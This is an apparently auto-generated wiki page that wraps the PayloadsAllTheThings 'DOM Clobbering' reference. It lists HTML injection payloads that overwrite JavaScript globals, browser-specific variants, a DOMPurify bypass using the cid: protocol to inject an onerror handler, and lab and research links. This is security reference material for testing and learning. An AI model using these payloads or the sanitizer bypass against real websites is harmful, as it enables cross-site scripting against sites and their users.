---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# DOM Clobbering

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-dom-clobbering-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/DOM Clobbering/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DOM Clobbering](../../topics/dom-clobbering/dom-clobbering.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-dom-clobbering-readme |
| name | DOM Clobbering |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DOM%20Clobbering/README.md |

## Preserved Source Material

````yaml
_body: "# DOM Clobbering\n\n> DOM Clobbering is a technique where global variables can be overwritten or \"clobbered\" by\
  \ naming HTML elements with certain IDs or names. This can cause unexpected behavior in scripts and potentially lead to\
  \ security vulnerabilities.\n\n## Summary\n\n- [Tools](#tools)\n- [Methodology](#methodology)\n- [Labs](#labs)\n- [References](#references)\n\
  \n## Tools\n\n- [SoheilKhodayari/DOMClobbering](https://domclob.xyz/domc_markups/list) - Comprehensive List of DOM Clobbering\
  \ Payloads for Mobile and Desktop Web Browsers\n- [yeswehack/Dom-Explorer](https://github.com/yeswehack/Dom-Explorer) -\
  \ A web-based tool designed for testing various HTML parsers and sanitizers.\n- [yeswehack/Dom-Explorer Live](https://yeswehack.github.io/Dom-Explorer/dom-explorer#eyJpbnB1dCI6IiIsInBpcGVsaW5lcyI6W3siaWQiOiJ0ZGpvZjYwNSIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJhYjU1anN2YyIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==)\
  \ - Reveal how browsers parse HTML and find mutated XSS vulnerabilities\n\n## Methodology\n\nExploitation requires any kind\
  \ of `HTML injection` in the page.\n\n- Clobbering `x.y.value`\n\n    ```html\n    // Payload\n    <form id=x><output id=y>I've\
  \ been clobbered</output>\n\n    // Sink\n    <script>alert(x.y.value);</script>\n    ```\n\n- Clobbering `x.y` using ID\
  \ and name attributes together to form a DOM collection\n\n    ```html\n    // Payload\n    <a id=x><a id=x name=y href=\"\
  Clobbered\">\n\n    // Sink\n    <script>alert(x.y)</script>\n    ```\n\n- Clobbering `x.y.z` - 3 levels deep\n\n    ```html\n\
  \    // Payload\n    <form id=x name=y><input id=z></form>\n    <form id=x></form>\n\n    // Sink\n    <script>alert(x.y.z)</script>\n\
  \    ```\n\n- Clobbering `a.b.c.d` - more than 3 levels\n\n    ```html\n    // Payload\n    <iframe name=a srcdoc=\"\n \
  \   <iframe srcdoc='<a id=c name=d href=cid:Clobbered>test</a><a id=c>' name=b>\"></iframe>\n    <style>@import '//portswigger.net';</style>\n\
  \n    // Sink\n    <script>alert(a.b.c.d)</script>\n    ```\n\n- Clobbering `forEach` (Chrome only)\n\n    ```html\n   \
  \ // Payload\n    <form id=x>\n    <input id=y name=z>\n    <input id=y>\n    </form>\n\n    // Sink\n    <script>x.y.forEach(element=>alert(element))</script>\n\
  \    ```\n\n- Clobbering `document.getElementById()` using `<html>` or `<body>` tag with the same `id` attribute\n\n   \
  \ ```html\n    // Payloads\n    <html id=\"cdnDomain\">clobbered</html>\n    <svg><body id=cdnDomain>clobbered</body></svg>\n\
  \n\n    // Sink \n    <script>\n    alert(document.getElementById('cdnDomain').innerText);//clobbbered\n    </script>\n\
  \    ```\n\n- Clobbering `x.username`\n\n    ```html\n    // Payload\n    <a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\"\
  >\n\n    // Sink\n    <script>\n    alert(x.username)//Clobbered-username\n    alert(x.password)//Clobbered-password\n \
  \   </script>\n    ```\n\n- Clobbering (Firefox only)\n\n    ```html\n    // Payload\n    <base href=a:abc><a id=x href=\"\
  Firefox<>\">\n\n    // Sink\n    <script>\n    alert(x)//Firefox<>\n    </script>\n    ```\n\n- Clobbering (Chrome only)\n\
  \n    ```html\n    // Payload\n    <base href=\"a://Clobbered<>\"><a id=x name=x><a id=x name=xyz href=123>\n\n    // Sink\n\
  \    <script>\n    alert(x.xyz)//a://Clobbered<>\n    </script>\n    ```\n\n## Tricks\n\n- DomPurify allows the protocol\
  \ `cid:`, which doesn't encode double quote (`\"`): `<a id=defaultAvatar><a id=defaultAvatar name=avatar href=\"cid:&quot;onerror=alert(1)//\"\
  >`\n\n## Labs\n\n- [PortSwigger - Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)\n\
  - [PortSwigger - Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)\n\
  - [PortSwigger - DOM clobbering test case protected by CSP](https://portswigger-labs.net/dom-invader/testcases/augmented-dom-script-dom-clobbering-csp/)\n\
  \n## References\n\n- [Bypassing CSP via DOM clobbering - Gareth Heyes - June 5, 2023](https://web.archive.org/web/20251114182213/https://portswigger.net/research/bypassing-csp-via-dom-clobbering)\n\
  - [DOM Clobbering - HackTricks - January 27, 2023](https://web.archive.org/web/20241215205040/https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)\n\
  - [DOM Clobbering - PortSwigger - September 25, 2020](https://web.archive.org/web/20260218083100/https://portswigger.net/web-security/dom-based/dom-clobbering)\n\
  - [DOM Clobbering strikes back - Gareth Heyes - February 6, 2020](https://web.archive.org/web/20200224065316/https://portswigger.net/research/dom-clobbering-strikes-back)\n\
  - [Hijacking service workers via DOM Clobbering - Gareth Heyes - November 29, 2022](https://web.archive.org/web/20260123013910/https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)"
_relative_path: DOM Clobbering/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/DOM Clobbering/README.md
````
